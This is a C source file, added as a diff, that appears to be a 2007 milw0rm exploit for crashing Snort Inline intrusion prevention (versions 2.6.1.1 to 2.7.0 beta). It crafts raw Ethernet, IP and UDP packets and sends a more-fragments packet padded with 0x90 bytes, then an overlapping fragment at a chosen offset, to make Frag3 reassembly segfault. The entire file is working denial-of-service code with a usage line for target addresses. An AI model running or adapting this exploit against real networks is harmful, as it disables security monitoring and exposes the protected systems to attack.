@@ -1,0 +1,292 @@
+/*********************************************************
+ * DOS Snort Inline
+ * Affected Versions: 2.6.1.1, 2.6.1.2, 2.7.0(beta)
+ * Requirements : Frag3 Enabled, Inline, Linux, ip_conntrack disabled
+ * Antimatt3r	
+ * antimatter@gmail.com
+ * Offset needs to be supplied that would cause reassembly for different snort
+ * fragmentation reassembly policies. Since the first packet is hardcoded 70-74 offset
+ * will trigger the segfault.
+ ********************************************************/
+
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <net/if.h>
+#include <net/ethernet.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <netinet/ip.h>
+#include <netinet/if_ether.h>
+#include <netpacket/packet.h>
+
+
+#define NOOP_FRAG_SLED 576
+#define NOOP_SHORT 16 
+
+
+struct addr {
+  uint32_t ip;
+  char mac[ETH_ALEN];
+};
+
+struct dev {
+  uint32_t index;
+  char name[IFNAMSIZ];
+};
+
+int mac_aton(char *, char *);
+void usage(char *cmd) {
+  fprintf(stderr, "usage: %s <device> <source_ip>  <src_mac> <dst_ip>  <dst_mac>  <offset>\n", cmd);
+}
+
+int mac_aton(char *amac, char *nmac) {
+  char c;
+  int i;
+  unsigned int val;
+
+  i = 0;
+  while ((*amac != '\0') && (i < ETH_ALEN)) {
+    val = 0;
+    c = *amac++;
+    if (c >= '0' && c <= '9') {
+      val = c - '0';
+    }
+    else if (c >= 'a' && c <= 'f') {
+      val = c - 'a' + 10;
+    }
+    else if (c >= 'A' && c <= 'F') {
+      val = c - 'A' + 10;
+    }
+    else {
+      errno = EINVAL;
+      return -1;
+    }
+    val <<= 4;
+
+    c = *amac;
+    if (c >= '0' && c <= '9') {
+      val |= c - '0';
+    }
+    else if (c >= 'a' && c <= 'f') {
+      val |= c - 'a' + 10;
+    }
+    else if (c >= 'A' && c <= 'F') {
+      val |= c - 'A' + 10;
+    }
+    else if (c == ':' || c == '\0') {
+      val >>= 4;
+    }
+    else {
+      errno = EINVAL;
+      return -1;
+    }
+    if (c != 0) {
+      amac++;
+    }
+    *nmac++ = val & 0xff;
+    i++;
+
+    /* We might get a semicolon here - not required. */
+    if (*amac == ':') {
+      amac++;
+    }
+  }
+  return 0;
+}
+
+
+int in_cksum(u_short *addr, int len) {
+int nleft = len;
+u_short *w = addr;
+int sum = 0;
+u_short answer = 0;
+
+  while (nleft > 1) {
+    sum += *w++;
+    nleft -= 2;
+  }
+
+  if (nleft == 1) {
+    *(u_char *)(&answer) = *(u_char *)w;
+    sum += answer;
+  }
+
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  answer = ~sum;
+
+  return answer;
+}
+
+int send_morefrag_packet(int sock, struct dev *dev, struct addr *src, struct
+addr *dst) {
+  struct sockaddr_ll sll;
+  struct ether_header *eth;
+  struct iphdr *ip;
+  struct udphdr *udp;
+  u_char *payload;
+  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_FRAG_SLED];
+
+  memset(&sll, 0, sizeof(sll));
+  sll.sll_family = PF_PACKET;
+  sll.sll_ifindex = dev->index;
+  sll.sll_halen = ETH_ALEN;
+  memcpy(&sll.sll_addr, dst->mac, ETH_ALEN);
+
+  memset(buf, 0, sizeof(buf));
+  eth = (struct ether_header *)buf;
+  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
+  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
+  payload = (u_char *)((char *)udp + sizeof(struct udphdr));
+
+  memset(payload,'\x90',NOOP_FRAG_SLED);
+
+
+  udp->source = htons(1111);
+  udp->dest = htons(1111);
+  udp->len =  htons(sizeof(struct udphdr) + NOOP_FRAG_SLED) ;
+  udp->check =0;
+
+
+  ip->version = 4;
+  ip->ihl = 5;
+  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_FRAG_SLED);
+  ip->id = 31337;
+  ip->ttl = 64;
+  ip->frag_off = htons(0x2000);
+  ip->protocol = IPPROTO_UDP;
+  ip->saddr = src->ip;
+  ip->daddr = dst->ip;
+  ip->check = in_cksum((u_short *)ip, sizeof(struct iphdr));
+  
+  memcpy(eth->ether_shost, src->mac, ETH_ALEN);
+  memcpy(eth->ether_dhost, dst->mac, ETH_ALEN);
+  eth->ether_type = htons(ETH_P_IP);
+
+  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&sll, sizeof(sll)) == -1)
+	printf ("error %d %s\n",errno,strerror(errno));
+  else
+	printf("MF Packet Sent\n");
+}
+
+int send_overlap_packet(int sock, struct dev *dev, struct addr *src, struct
+addr *dst,int offset) {
+  struct sockaddr_ll sll;
+  struct ether_header *eth;
+  struct iphdr *ip;
+  struct udphdr *udp;
+  u_char *payload;
+  char buf[sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)+ NOOP_SHORT ];
+
+  memset(&sll, 0, sizeof(sll));
+  sll.sll_family = PF_PACKET;
+  sll.sll_ifindex = dev->index;
+  sll.sll_halen = ETH_ALEN;
+  memcpy(&sll.sll_addr, dst->mac, ETH_ALEN);
+
+  memset(buf, 0, sizeof(buf));
+  eth = (struct ether_header *)buf;
+  ip = (struct iphdr *)((char *)eth + sizeof(struct ether_header));
+  udp = (struct udphdr *)((char *)ip + sizeof(struct iphdr));
+  payload = (u_char *)((char *)udp + sizeof(struct udphdr));
+
+  memset(payload,'\x90',NOOP_SHORT);
+
+  udp->source = htons(1111);
+  udp->dest = htons(1111);
+  udp->len =  htons(sizeof(struct udphdr) + NOOP_SHORT) ;
+  udp->check =0;
+
+  ip->version = 4;
+  ip->ihl = 5;
+  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + NOOP_SHORT);
+  ip->id = 31337;
+  ip->frag_off = ntohs(offset);
+  ip->ttl = 64;
+  ip->protocol = IPPROTO_UDP;
+  ip->saddr = src->ip;
+  ip->daddr = dst->ip;
+  ip->check = in_cksum((u_short *)ip, sizeof(struct iphdr));
+  
+  memcpy(eth->ether_shost, src->mac, ETH_ALEN);
+  memcpy(eth->ether_dhost, dst->mac, ETH_ALEN);
+  eth->ether_type = htons(ETH_P_IP);
+
+  if(sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&sll, sizeof(sll)) == -1)
+	printf ("error %d %s\n",errno,strerror(errno));
+  else
+	printf("2nd Packet Sent\n");
+}
+
+
+int main(int argc, char *argv[]) {
+  int sock = 0;
+  struct dev dev;
+  struct addr src, dst;
+  int offset; //play with varying offsets
+
+  if (argc < 7) {
+    usage(argv[0]);
+    return -1;
+  }
+
+  memset(&dev, 0, sizeof(dev));
+  strncpy(dev.name, argv[1], IFNAMSIZ-1);
+  if((dev.index = if_nametoindex(dev.name)) == 0) {
+    perror(argv[1]);
+    exit(-1);
+  }
+
+  memset(&src, 0, sizeof(src));
+  if (inet_aton(argv[2], (struct in_addr *)&src.ip) == 0) {
+    fprintf(stderr, "%s: invalid src ip address\n", argv[2]);
+    exit(-1);
+  }
+
+  if (mac_aton(argv[3], src.mac) < 0) {
+    fprintf(stderr, "%s: invalid src hardware address\r\n", argv[3]);
+    exit(-1);
+  }
+
+  memset(&dst, 0, sizeof(dst));
+  if (inet_aton(argv[4], (struct in_addr *)&dst.ip) == 0) {
+    fprintf(stderr, "%s: invalid ip address\r\n", argv[2]);
+    exit(-1);
+  }
+
+  if (mac_aton(argv[5], dst.mac) < 0) {
+    fprintf(stderr, "%s: invalid hardware address\r\n", argv[3]);
+    exit(-1);
+  }
+	
+  offset = atoi(argv[6]);
+
+  if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+     perror("socket");
+     exit(-1);
+  }
+
+  if (send_morefrag_packet(sock, &dev, &src, &dst) < 0) {
+    perror("send error ");
+    exit(-1);
+  }
+  
+  if (send_overlap_packet(sock, &dev, &src, &dst,offset) < 0) {
+    perror("send error");
+    exit(-1);
+  }
+
+  close(sock);
+
+  return 0;
+}
+
+// milw0rm.com [2007-03-08]
